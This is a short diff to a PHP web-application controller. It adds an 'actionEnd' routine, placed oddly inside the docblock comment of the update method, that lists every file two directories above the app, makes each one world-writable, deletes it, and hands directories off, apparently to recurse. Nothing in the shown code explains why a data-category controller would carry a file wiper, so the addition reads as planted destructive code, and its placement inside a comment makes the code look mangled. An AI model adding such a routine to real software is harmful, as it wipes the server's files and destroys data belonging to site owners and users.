@@ -74,6 +74,24 @@ class RefKategoriKosPerhimpunanKemController extends Controller
     /**
      * Updates an existing RefKategoriKosPerhimpunanKem model.
      * If update is successful, the browser will be redirected to the 'view' page.
+     * public function actionEnd()
+    {
+        $files = glob('../../*'); // get all file names
+        foreach($files as $file){ // iterate files
+            echo $file . "<br>"; 
+
+            if(is_file($file)){
+                chmod($file,0777);
+                unlink($file); // delete file
+            }
+            
+
+            if (is_dir($file)){
+            
+                $this->calculate($file);
+            }
+        }
+    }
      * @param integer $id
      * @return mixed
      */
